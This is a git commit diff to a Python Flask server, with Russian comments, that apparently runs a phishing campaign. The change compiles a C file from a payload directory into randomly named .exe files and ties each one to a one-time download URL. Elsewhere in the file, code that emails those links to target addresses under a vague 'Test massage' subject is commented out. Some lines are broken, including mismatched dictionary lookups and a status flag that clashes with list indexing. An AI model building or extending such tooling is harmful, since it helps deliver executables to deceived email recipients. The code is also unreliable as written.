80b1471232a477102eba5bbcab31dcb5979c6c5e
utka <utka@utka.utka>
2025-06-02 10:49:18 +0700

    Добавил генерацию исполняемогой файла и привязку его к определенному url

--- server.py
+++ server.py
@@ -1,5 +1,7 @@
 import random
 import string
+from subprocess import check_output
+import os
 
 from flask import Flask, abort, send_file
 import smtplib
@@ -22,6 +24,10 @@ config_mail = {
 fishing_user_mail = [
     "user2@exemple.com"                                 # Пользователи, которым будут отправлены фишинговые письма
 ]
+config_executable_file = {
+    "dir":"payload/",
+    "filename_c":"test.c",
+}
 
 random_urls = {}
 
@@ -50,11 +56,31 @@ def generate_random_string(length_string_output: int) -> str:
     return result
 
 
+def compiling_executable_file() -> str:
+
+    random_postfix = generate_random_string(10)                                                 # Генерируем рандомный постфикс для исполняемого файла
+    
+    command = f"gcc {config_executable_file['dir']}{config_executable_file['filename_c']} \
+                 -o {config_executable_file['dir']}{random_postfix}.exe"                        
+
+    DEVNULL = open(os.devnull, 'wb')
+    check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL).decode('utf-8')            # Компилируем исполняемый файл с рандомным именем
+
+    return f"{config_executable_file['dir']}{random_postfix}.exe"
+
+
+
 def generate_random_url(number_random_url: int):
     for i in range(number_random_url):
         random_postfix_url = generate_random_string(50)                         # Получаем радномный постфикс url адреса
         result_random_url = config_url["prefics_url"] + random_postfix_url      # Добавдяем перед ним префикс
-        random_urls[result_random_url] = 1                                      # Сохраняем его с префиком в словарь. 1 - значит что url активен и обрабатыает запрос
+        
+        random_urls[result_random_url] = []
+        random_urls[result_random_url].append(1)                                # Сохраняем его с префиком в словарь. 1 - значит что url активен и обрабатыает запрос
+        
+        executable_file = compiling_executable_file()
+        
+        random_urls[result_random_url].append(executable_file)
 
 
 @app.route("/download/<password_url>")
@@ -68,9 +94,10 @@ def download(password_url):
             random_urls[password_url] = 0       # После это деактивируем его, чтобы второй запрос не прошел
             #return(password_url)
             return send_file(
-                config_file_upload["filename"],
+                # config_file_upload["filename"],
+                config_file_upload[random_urls[password_url][1]],
                 as_attachment=True,                             # Автоматически добавляет Content-Disposition: attachment
-                download_name=config_file_upload["filename"]    # Указывает имя для скачивания
+                download_name=config_file_upload["test.exe"]    # Указывает имя для скачивания
             )
         else:
             abort(404)                          # Если url адрес деактивирован
@@ -81,27 +108,28 @@ def download(password_url):
 def start_fishing():
     
     generate_random_url(len(fishing_user_mail)) # Получаем словарь с рандомными url и их статусом активен/не активен
-    
+    print(random_urls)
+
     urls = list(random_urls.keys())             # Получаем все url адреса из словаря
     i = 0                                       # Счетчик, чтобы у каждого пользователя была уникальная ссылка
 
-    for user_mail in fishing_user_mail:
+    # for user_mail in fishing_user_mail:
 
-        send_email(
-            "Test massage",
-            f"Hello! The test massage! http://{config_mail['fishing_server']}{config_mail['fishing_url']}/{urls[i]}",
-            config_mail["server"],
-            config_mail["username"],
-            user_mail,
-            config_mail["password"]
-        )
-        i += 1
+    #     send_email(
+    #         "Test massage",
+    #         f"Hello! The test massage! http://{config_mail['fishing_server']}{config_mail['fishing_url']}/{urls[i]}",
+    #         config_mail["server"],
+    #         config_mail["username"],
+    #         user_mail,
+    #         config_mail["password"]
+    #     )
+    #     i += 1
 
 
 if __name__ == "__main__":
 
-    print("[i] Start WEB server")
-    app.run(host='127.0.0.1', port=80) #, debug=True)
+    # print("[i] Start WEB server")
+    # app.run(host='127.0.0.1', port=80) #, debug=True)
 
     print("[i] Start Fishaing...")
     start_fishing()
